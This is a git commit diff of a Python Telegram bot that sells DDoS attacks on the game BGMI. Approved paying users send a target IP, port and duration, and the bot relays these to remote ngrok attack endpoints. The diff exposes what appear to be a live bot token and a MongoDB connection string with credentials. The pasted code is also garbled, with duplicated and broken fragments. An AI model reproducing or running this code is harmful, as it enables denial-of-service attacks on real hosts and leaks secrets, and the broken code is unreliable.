a591b7d11d7f38c6f762cb6ee68c9bd851b36ff2
bzjzjsjs <thakurthakur7380@gmail.com>
2025-01-26 16:02:34 +0530

    Update soul.py

--- soul.py
+++ soul.py
@@ -171,6 +171,180 @@ def process_attack_command(message):
 
 def is_user_admin(user_id, chat_id):
     try:
+
+import os
+import telebot
+import json
+import requests
+import logging
+import time
+from pymongo import MongoClient
+from datetime import datetime, timedelta
+import certifi
+import asyncio
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton
+from threading import Thread
+
+loop = asyncio.get_event_loop()
+TOKEN = '8196957560:AAFuW1U-e5aBxqP6BQ1CPMVIrtAiXf0IITY'
+MONGO_URI = 'mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv'
+FORWARD_CHANNEL_ID = -1002216351766
+CHANNEL_ID = -1002216351766
+error_channel_id = -1002216351766
+
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
+db = client['rishi']
+users_collection = db.users
+bot = telebot.TeleBot(TOKEN)
+
+REQUEST_INTERVAL = 1
+blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
+
+
+current_group_index = 0
+
+async def run_attack_command_async(target_ip, target_port, duration):
+    # Define 9 groups of files
+    groups = [
+        ["soul.txt", "soul2.txt"],
+        ["soul3.txt", "soul4.txt"],
+        ["soul5.txt", "soul6.txt"],
+        ["soul7.txt", "soul8.txt"],
+        ["soul9.txt", "soul10.txt"],
+        ["soul11.txt", "soul12.txt"],
+        ["soul13.txt", "soul14.txt"],
+        ["soul15.txt", "soul16.txt"],
+        ["soul17.txt", "soul18.txt"]
+    ]
+
+    global current_group_index
+
+    # Get the current group of files
+    current_group = groups[current_group_index]
+
+    # Process all files in the current group
+    for current_file in current_group:
+        try:
+            with open(current_file, "r") as file:
+                ngrok_url = file.read().strip()
+
+            url = f"{ngrok_url}/bgmi?ip={target_ip}&port={target_port}&time={duration}"
+            headers = {"ngrok-skip-browser-warning": "any_value"}
+            response = requests.get(url, headers=headers)
+
+            if response.status_code == 200:
+                logging.info(f"Attack command sent successfully: {url}")
+                logging.info(f"Response: {response.json()}")
+            else:
+                logging.error(f"Failed to send attack command. Status code: {response.status_code}")
+                logging.error(f"Response: {response.text}")
+        except Exception as e:
+            logging.error(f"Failed to execute command with {current_file}: {e}")
+
+    current_group_index = (current_group_index + 1) % len(groups)
+    logging.info(f"Switching to group {current_group_index + 1} for the next attack command.")
+
+
+
+async def start_asyncio_loop():
+    while True:
+        await asyncio.sleep(REQUEST_INTERVAL)
+def check_user_approval(user_id):
+    user_data = users_collection.find_one({"user_id": user_id})
+    if user_data and user_data['plan'] > 0:
+        return True
+    return False
+def send_not_approved_message(chat_id):
+    bot.send_message(chat_id, "*🚫 YOU ARE NOT APPROVED 🚫\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n👉 Contact an Admin or the Owner for approval*", parse_mode='Markdown')
+@bot.message_handler(commands=['approve', 'disapprove'])
+def approve_or_disapprove_user(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    is_admin = is_user_admin(user_id, CHANNEL_ID)
+    cmd_parts = message.text.split()
+    if not is_admin:
+        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
+        return
+
+    if len(cmd_parts) < 2:
+        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
+        return
+
+    action = cmd_parts[0]
+    target_user_id = int(cmd_parts[1])
+    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
+    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
+    if action == '/approve':
+        if plan == 1:
+            if users_collection.count_documents({"plan": 1}) >= 99:
+                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
+                return
+        elif plan == 2:
+            if users_collection.count_documents({"plan": 2}) >= 499:
+                bot.send_message(chat_id, "*Approval failed: Attack limit reached (499 users).*", parse_mode='Markdown')
+                return
+
+
+
+        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
+        users_collection.update_one(
+            {"user_id": target_user_id},
+            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
+            upsert=True
+        )
+        msg_text = f"*✅ User {target_user_id} approved for {plan} days *"
+    else:
+        users_collection.update_one(
+            {"user_id": target_user_id},
+            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
+            upsert=True
+        )
+        msg_text = f"*User {target_user_id} disapproved*"
+
+    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
+    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
+
+
+@bot.message_handler(commands=['Attack'])
+def attack_command(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+
+    if not check_user_approval(user_id):
+        send_not_approved_message(chat_id)
+        return
+
+    try:
+        bot.send_message(chat_id, "*Please provide the details for the attack in the following format:\n\n<ip> <port> <time>*", parse_mode='Markdown')
+        bot.register_next_step_handler(message, process_attack_command)
+    except Exception as e:
+        logging.error(f"Error in attack command: {e}")
+
+def process_attack_command(message):
+    try:
+        args = message.text.split()
+        if len(args) != 3:
+            bot.send_message(message.chat.id, "*Invalid Format\n\nUse <IP> <PORT> <TIME>*", parse_mode='Markdown')
+            return
+        target_ip, target_port, duration = args[0], int(args[1]), args[2]
+
+        if target_port in blocked_ports:
+            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
+            return
+
+        # Dynamically call the attack function using asyncio
+        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
+        username = message.from_user.username
+        bot.send_message(message.chat.id, f"*🚀 Attack Sent Successfully! 🚀\n\nTarget: {target_ip}:{target_port}\nTime: {duration} seconds\nAttacker Name: {username}*", parse_mode='Markdown')
+    except Exception as e:
+        logging.error(f"Error in processing attack command: {e}")
+
+
+
+
+def is_user_admin(user_id, chat_id):
+    try:
         return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
     except:
         return False
@@ -216,6 +390,26 @@ def handle_message(message):
             valid_until = user_data.get('valid_until', 'N/A')
             current_time = datetime.now().isoformat()
             response = (f"*USERNAME: @{username}\n"
+                        f"USER ID: {user_id}\n"
+                        f"PLAN: {plan} days\n"
+                        f"METHOD: bgmi ddos*")
+        else:
+            response = "*No account information found. Please contact the administrator.*"
+        bot.reply_to(message, response, parse_mode='Markdown')
+    else:
+        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
+
+if __name__ == "__main__":
+    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
+    asyncio_thread.start()
+    logging.info("Starting Codespace activity keeper and Telegram bot...")
+    while True:
+        try:
+            bot.polling(none_stop=True)
+        except Exception as e:
+            logging.error(f"An error occurred while polling: {e}")
+        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
+        time.sleep(REQUEST_INTERVAL)       response = (f"*USERNAME: @{username}\n"
                         f"USER ID: {user_id}\n"
                         f"PLAN: {plan} days\n"
                         f"METHOD: bgmi ddos*")
